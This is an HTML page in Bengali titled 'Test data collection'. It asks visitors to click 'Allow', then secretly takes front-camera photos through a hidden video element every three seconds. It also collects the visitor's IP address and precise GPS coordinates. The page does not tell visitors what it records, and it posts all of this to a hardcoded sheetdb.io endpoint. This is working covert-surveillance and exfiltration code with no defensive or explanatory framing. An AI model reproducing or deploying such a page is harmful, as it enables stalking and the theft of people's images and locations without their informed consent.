<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>টেস্ট ডাটা সংগ্রহ - ফোন মোড</title>
    <style>
        body { font-family: sans-serif; text-align: center; background-color: #f4f4f4; padding: 20px; }
        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        #status { color: red; font-weight: bold; margin-top: 15px; }
        .btn { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2>টেস্ট ডাটা সংগ্রহ</h2>
    <p>নিচের বাটনে ক্লিক করে 'Allow' করুন।</p>
    <button class="btn" id="startBtn">শুরু করুন</button>
    <div id="status">পারমিশন এর জন্য অপেক্ষা...</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const apiURL = "https://sheetdb.io/api/v1/ey67387uzrxk5?sheet=Sheet8";
    const statusDiv = document.getElementById('status');
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    let userIP = "Loading...";

    // আইপি সংগ্রহ
    async function fetchIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (e) { userIP = "IP Error"; }
    }

    // জিপিএস সংগ্রহ (ফোনের জন্য অপ্টিমাইজড)
    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve("Not Supported");
            } else {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
                    (err) => resolve("Error: " + err.message),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        });
    }

    // ডাটা পাঠানো
    async function sendToSheet(base64Img, gps) {
        try {
            const response = await fetch(apiURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "data": [{ "img": base64Img, "ip": userIP, "gps": gps }]
                })
            });
            if (response.ok) {
                statusDiv.innerText = "ডাটা সফলভাবে পাঠানো হয়েছে!";
                statusDiv.style.color = "green";
            }
        } catch (e) {
            statusDiv.innerText = "পাঠাতে সমস্যা হয়েছে!";
        }
    }

    // মেইন প্রসেস
    async function mainTask() {
        statusDiv.style.color = "blue";
        statusDiv.innerText = "লোকেশন এবং ছবি সংগ্রহ হচ্ছে...";
        
        // জিপিএস না আসা পর্যন্ত এখানে ওয়েট করবে
        const gpsData = await getGPS();
        
        // ছবি তোলা
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        const base64Img = canvas.toDataURL('image/jpeg', 0.4);

        // সিটে পাঠানো
        await sendToSheet(base64Img, gpsData);
    }

    startBtn.addEventListener('click', async () => {
        startBtn.style.display = 'none';
        statusDiv.innerText = "ক্যামেরা এক্সেস করা হচ্ছে...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            video.srcObject = stream;
            
            await fetchIP();

            // প্রথমবার সাথে সাথে রান
            await mainTask();

            // প্রতি ৩ সেকেন্ড পর পর লুপ
            setInterval(async () => {
                await mainTask();
            }, 3000);

        } catch (err) {
            statusDiv.innerText = "পারমিশন রিজেক্ট করা হয়েছে!";
            console.error(err);
        }
    });
</script>

</body>
  </html>
